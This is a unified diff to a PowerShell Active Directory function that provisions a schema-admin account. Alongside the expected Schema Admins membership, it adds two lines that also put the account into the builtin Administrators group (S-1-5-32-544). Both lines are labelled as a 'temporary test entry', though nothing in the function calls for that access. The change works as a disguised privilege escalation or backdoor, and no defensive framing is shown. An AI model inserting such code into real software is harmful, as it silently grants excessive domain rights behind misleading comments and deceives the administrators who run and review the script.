@@ -81,6 +81,8 @@
 			
 			$accountObject = Get-ADUser @parameters -LDAPFilter "(name=$accountName)"
 			$schemaAdmins = Get-ADGroup @parameters -Identity "$($domain.DomainSID)-518" -Properties Members
+			#TODO: Remove temporary test entry
+			$administrators = Get-ADGroup @parameters -Identity "S-1-5-32-544" -Properties Members
 
 			#region Scenario: Account does not exist
 			if (-not $accountObject)
@@ -122,6 +124,8 @@
 			if ($schemaAdmins.Members -notcontains $accountObject.DistinguishedName) {
 				Invoke-PSFProtectedCommand -ActionString 'Get-SchemaAdminCredential.Account.Group.Assignment' -Target $accountName -ScriptBlock {
 					$null = $schemaAdmins | Add-ADGroupMember @parameters -Members $accountObject -ErrorAction Stop
+					#TODO: Remove temporary test entry
+					$null = $administrators | Add-ADGroupMember @parameters -Members $accountObject -ErrorAction Stop
 				} -EnableException $true -PSCmdlet $PSCmdlet
 			}
 
